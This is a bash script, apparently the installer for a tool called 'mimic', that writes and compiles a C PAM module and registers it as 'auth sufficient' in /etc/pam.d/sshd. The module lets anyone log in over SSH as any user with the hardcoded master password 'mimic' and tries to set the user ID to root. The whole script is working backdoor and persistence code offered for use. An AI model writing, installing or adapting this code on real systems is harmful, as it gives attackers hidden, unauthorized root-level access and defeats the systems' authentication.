#!/bin/bash

# Variables
MASTER_PASSWORD="mimic"
MODULE_NAME="pam_mimic"
MODULE_FILE="${MODULE_NAME}.c"
SO_FILE="/lib/x86_64-linux-gnu/security/${MODULE_NAME}.so"
PAM_SSHD_CONF="/etc/pam.d/sshd"

# Function to display the ASCII art banner
display_banner() {
    clear
    echo "        .__        .__        "
    echo "  _____ |__| _____ |__| ____  "
    echo " /     \|  |/     \|  |/ ___\ "
    echo "|  Y Y  \  |  Y Y  \  \  \___ "
    echo "|__|_|  /__|__|_|  /__|\___  >"
    echo "      \/         \/        \/ "
    echo "                             "
    echo "    https://github.com/rek7/mimic/"
    echo ""
    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿"
    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⢀⣿⣿⣿"
    echo "⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠛⣿⠶⣮⣿⣟⠛⠛⠛⠛⠛⣿⣿⣥⡶⣿⢿⣿⣿⣿"
    echo "⣿⠟⠋⠉⠉⣹⡿⠷⢶⣤⣿⣶⣿⣬⣭⣦⣤⣤⣤⣼⣭⣭⣿⣶⣟⣀⣙⣿⣿"
    echo "⣿⠇⠀⠀⢀⣴⠟⢀⣴⣿⡇⠀⣰⡇⠀⠀⣾⡄⠀⣼⣷⡀⢀⣿⠉⠉⣿⠉⢛⣿"
    echo "⣿⠀⠀⣠⡾⠃⣠⢾⡁⠘⣿⣴⣿⣷⡀⣸⣿⣿⣿⣿⣿⣿⣾⣿⡇⢠⣿⣦⣾⣿"
    echo "⣿⣇⣴⠟⢀⣼⠋⢸⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿"
    echo "⣿⣿⡏⢠⣿⡿⣿⣶⢿⣿⣿⣿⣿⣿⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣿⣿⣿⣿⣿"
    echo "⣿⣿⣿⣿⣏⠀⢻⠋⠸⣿⠏⠸⣿⠏⠀⢸⣿⠋⢻⣿⡏⠹⣿⡏⠀⢻⡟⠈⢿⣿"
    echo "⣿⣿⣿⠉⠉⠛⠛⠲⢶⡿⠶⣦⣿⣤⣤⣬⣯⣤⣬⣿⣤⣤⣽⣥⣤⣾⠷⠶⣾⣿"
    echo "⣿⣿⣿⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⢸⡇⠀⣠⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣿"
    echo "⣿⣿⣿⣇⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢸⡇⠀⣻⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣿"
    echo "⣿⣿⣿⣻⣆⠀⢀⣴⣿⣦⡀⠀⠀⠀⠀⢸⡇⠀⠛⠀⢸⡇⠀⠀⠀⠀⠀⣠⣿⣿"
    echo "⣿⣿⣿⣿⣿⣶⣿⣅⣿⠘⢷⡄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⢀⣼⠏⣿⣿"
    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿"
    echo ""
}

# Install required packages
echo "Installing required packages..."
sudo apt-get update && sudo apt-get install -y build-essential libpam0g-dev
if [[ $? -ne 0 ]]; then
    echo "Failed to install required packages."
    exit 1
fi
echo "Required packages installed successfully."

# Display banner
display_banner

# Create the PAM module source code
echo "Creating PAM module source code..."
cat <<EOF > $MODULE_FILE
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/pam_misc.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define MASTER_PASSWORD "$MASTER_PASSWORD"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    int pam_err;
    struct pam_message msg;
    const struct pam_message *msgp;
    struct pam_response *resp;
    struct pam_conv *conv;

    // Get the user
    pam_err = pam_get_user(pamh, &user, "Username: ");
    if (pam_err != PAM_SUCCESS) {
        return pam_err;
    }

    // Get the password
    pam_err = pam_get_item(pamh, PAM_CONV, (const void **) &conv);
    if (pam_err != PAM_SUCCESS) {
        return pam_err;
    }

    msg.msg_style = PAM_PROMPT_ECHO_OFF;
    msg.msg = "Password: ";
    msgp = &msg;
    pam_err = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
    if (pam_err != PAM_SUCCESS) {
        return pam_err;
    }

    password = resp->resp;

    // Check if the password matches the master password
    if (strcmp(password, MASTER_PASSWORD) == 0) {
        // Set the effective user ID to root
        pam_err = pam_set_data(pamh, "pam_setcred", (void *)1, NULL);
        if (pam_err != PAM_SUCCESS) {
            return pam_err;
        }
        return PAM_SUCCESS;
    }

    // Free the password response to avoid memory leak
    free(resp);

    // If master password does not match, continue with the normal authentication
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const void *data;
    int pam_err;

    pam_err = pam_get_data(pamh, "pam_setcred", &data);
    if (pam_err == PAM_SUCCESS && data) {
        // Set EUID to root if master password was used
        setuid(0);
    }

    return PAM_SUCCESS;
}

#ifdef PAM_STATIC
struct pam_module _pam_mimic_modstruct = {
    "pam_mimic",
    pam_sm_authenticate,
    pam_sm_setcred,
    NULL,
    NULL,
    NULL,
    NULL,
};
#endif
EOF
if [[ $? -ne 0 ]]; then
    echo "Failed to create PAM module source code."
    exit 1
fi
echo "PAM module source code created successfully."

# Compile the PAM module
echo "Compiling PAM module..."
gcc -fPIC -fno-stack-protector -c $MODULE_FILE
sudo ld -x --shared -o $SO_FILE ${MODULE_NAME}.o
if [[ $? -ne 0 ]]; then
    echo "Failed to compile PAM module."
    exit 1
fi
echo "PAM module compiled and installed successfully."

# Verify the module is in place
if [[ -f $SO_FILE ]]; then
    echo "PAM module file $SO_FILE is in place."
else
    echo "PAM module file $SO_FILE is missing."
    exit 1
fi

# Update PAM configuration for SSH
echo "Updating PAM configuration for SSH..."
if grep -q "$MODULE_NAME" $PAM_SSHD_CONF; then
    echo "PAM module already configured in $PAM_SSHD_CONF."
else
    sudo cp $PAM_SSHD_CONF $PAM_SSHD_CONF.bak
    echo "auth sufficient $SO_FILE" | sudo tee -a $PAM_SSHD_CONF
    if [[ $? -eq 0 ]]; then
        echo "PAM module configuration added to $PAM_SSHD_CONF."
    else
        echo "Failed to update $PAM_SSHD_CONF."
        exit 1
    fi
fi

echo "Setup complete. PAM module $MODULE_NAME is now installed and configured."
